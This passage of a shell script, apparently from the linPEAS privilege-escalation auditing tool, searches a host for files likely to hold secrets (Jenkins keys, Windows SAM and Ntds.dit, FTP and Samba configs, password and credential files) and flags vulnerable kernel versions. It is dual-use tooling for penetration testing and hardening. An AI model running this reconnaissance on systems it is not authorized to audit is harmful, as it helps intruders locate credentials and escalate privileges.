  PSTORAGE_FTP=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "vsftpd\.conf$|.*\.ftpconfig$|ffftp\.ini$|ftp\.ini$|ftp\.config$|sites\.ini$|wcx_ftp\.ini$|winscp\.ini$|ws_ftp\.ini$" | sort | uniq | head -n 70)
  PSTORAGE_SAMBA=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "smb\.conf$" | sort | uniq | head -n 70)
  PSTORAGE_DNS=$(echo -e "$FIND_DIR_SNAP\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_CDROM\n$FIND_DIR_OPT\n$FIND_DIR_PRIVATE\n$FIND_DIR_MNT\n$FIND_DIR_BIN\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_ETC\n$FIND_DIR_TMP\n$FIND_DIR_USR\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_SBIN\n$FIND_DIR_SRV\n$FIND_DIR_MEDIA\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}usr|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}var" | grep -E "bind$" | sort | uniq | head -n 70)
  PSTORAGE_SEEDDMS=$(echo -e "$FIND_DIR_SNAP\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_CDROM\n$FIND_DIR_OPT\n$FIND_DIR_PRIVATE\n$FIND_DIR_MNT\n$FIND_DIR_BIN\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_ETC\n$FIND_DIR_TMP\n$FIND_DIR_USR\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_SBIN\n$FIND_DIR_SRV\n$FIND_DIR_MEDIA\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "seeddms.*$" | sort | uniq | head -n 70)
  PSTORAGE_DDCLIENT=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "ddclient\.conf$" | sort | uniq | head -n 70)
  PSTORAGE_KCPASSWORD=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "kcpassword$" | sort | uniq | head -n 70)
  PSTORAGE_SENTRY=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_DIR_SNAP\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_CDROM\n$FIND_DIR_OPT\n$FIND_DIR_PRIVATE\n$FIND_DIR_MNT\n$FIND_DIR_BIN\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_ETC\n$FIND_DIR_TMP\n$FIND_DIR_USR\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_SBIN\n$FIND_DIR_SRV\n$FIND_DIR_MEDIA\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "sentry$|sentry\.conf\.py$" | sort | uniq | head -n 70)
  PSTORAGE_STRAPI=$(echo -e "$FIND_DIR_SNAP\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_CDROM\n$FIND_DIR_OPT\n$FIND_DIR_PRIVATE\n$FIND_DIR_MNT\n$FIND_DIR_BIN\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_ETC\n$FIND_DIR_TMP\n$FIND_DIR_USR\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_SBIN\n$FIND_DIR_SRV\n$FIND_DIR_MEDIA\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "environments$" | sort | uniq | head -n 70)
  PSTORAGE_CACTI=$(echo -e "$FIND_DIR_SNAP\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_CDROM\n$FIND_DIR_OPT\n$FIND_DIR_PRIVATE\n$FIND_DIR_MNT\n$FIND_DIR_BIN\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_ETC\n$FIND_DIR_TMP\n$FIND_DIR_USR\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_SBIN\n$FIND_DIR_SRV\n$FIND_DIR_MEDIA\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "cacti$" | sort | uniq | head -n 70)
  PSTORAGE_ROUNDCUBE=$(echo -e "$FIND_DIR_SNAP\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_CDROM\n$FIND_DIR_OPT\n$FIND_DIR_PRIVATE\n$FIND_DIR_MNT\n$FIND_DIR_BIN\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_ETC\n$FIND_DIR_TMP\n$FIND_DIR_USR\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_SBIN\n$FIND_DIR_SRV\n$FIND_DIR_MEDIA\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "roundcube$" | sort | uniq | head -n 70)
  PSTORAGE_PASSBOLT=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "passbolt\.php$" | sort | uniq | head -n 70)
  PSTORAGE_JETTY=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "jetty-realm\.properties$" | sort | uniq | head -n 70)
  PSTORAGE_JENKINS=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_DIR_SNAP\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_CDROM\n$FIND_DIR_OPT\n$FIND_DIR_PRIVATE\n$FIND_DIR_MNT\n$FIND_DIR_BIN\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_ETC\n$FIND_DIR_TMP\n$FIND_DIR_USR\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_SBIN\n$FIND_DIR_SRV\n$FIND_DIR_MEDIA\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "master\.key$|hudson\.util\.Secret$|credentials\.xml$|config\.xml$|.*jenkins$" | sort | uniq | head -n 70)
  PSTORAGE_WGET=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "\.wgetrc$" | sort | uniq | head -n 70)
  PSTORAGE_INTERESTING_LOGS=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "access\.log$|error\.log$" | sort | uniq | head -n 70)
  PSTORAGE_OTHER_INTERESTING=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "\.bashrc$|\.google_authenticator$|hosts\.equiv$|\.lesshst$|\.plan$|\.profile$|\.recently-used\.xbel$|\.rhosts$|\.sudo_as_admin_successful$" | sort | uniq | head -n 70)
  PSTORAGE_WINDOWS=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E ".*\.rdg$|AppEvent\.Evt$|autounattend\.xml$|ConsoleHost_history\.txt$|FreeSSHDservice\.ini$|NetSetup\.log$|Ntds\.dit$|protecteduserkey\.bin$|RDCMan\.settings$|SAM$|SYSTEM$|SecEvent\.Evt$|appcmd\.exe$|bash\.exe$|datasources\.xml$|default\.sav$|drives\.xml$|groups\.xml$|https-xampp\.conf$|https\.conf$|iis6\.log$|index\.dat$|my\.cnf$|my\.ini$|ntuser\.dat$|pagefile\.sys$|printers\.xml$|recentservers\.xml$|scclient\.exe$|scheduledtasks\.xml$|security\.sav$|server\.xml$|setupinfo$|setupinfo\.bak$|sitemanager\.xml$|sites\.ini$|software$|software\.sav$|sysprep\.inf$|sysprep\.xml$|system\.sav$|unattend\.inf$|unattend\.txt$|unattend\.xml$|unattended\.xml$|wcx_ftp\.ini$|ws_ftp\.ini$|web.*\.config$|winscp\.ini$|wsl\.exe$|plum\.sqlite$" | sort | uniq | head -n 70)
  PSTORAGE_DATABASE=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -v -E '/man/|/usr/|/var/cache/|thumbcache|iconcache|IconCache|/man/|/usr/|/var/cache/' | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E ".*\.db$|.*\.sqlite$|.*\.sqlite3$" | sort | uniq | head -n 70)
  PSTORAGE_BACKUPS=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "backup$|backups$" | sort | uniq | head -n 70)
  PSTORAGE_PASSWORD_FILES=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E ".*password.*$|.*credential.*$|creds.*$|.*\.key$" | sort | uniq | head -n 70)


  ##### POST SEARCH VARIABLES #####
  backup_folders_row="$(echo $PSTORAGE_BACKUPS | tr '\n' ' ')"
  printf ${YELLOW}"DONE\n"$NC
  echo ""
fi













if echo $CHECKS | grep -q system_information; then
print_title "System Information"
###########################################
#-------------) System Info (-------------#
###########################################

#-- SY) OS
print_2title "Operative system"
print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits"
(cat /proc/version || uname -a ) 2>/dev/null | sed -${E} "s,$kernelDCW_Ubuntu_Precise_1,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Ubuntu_Precise_2,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Ubuntu_Precise_3,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Ubuntu_Precise_4,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Ubuntu_Precise_5,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Ubuntu_Precise_6,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Ubuntu_Trusty_1,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Ubuntu_Trusty_2,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Ubuntu_Trusty_3,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Ubuntu_Trusty_4,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Ubuntu_Xenial,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Rhel5_1,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Rhel5_2,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Rhel5_3,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Rhel6_1,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Rhel6_2,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Rhel6_3,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Rhel6_4,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Rhel7,${SED_RED_YELLOW}," | sed -${E} "s,$kernelB,${SED_RED},"
warn_exec lsb_release -a 2>/dev/null
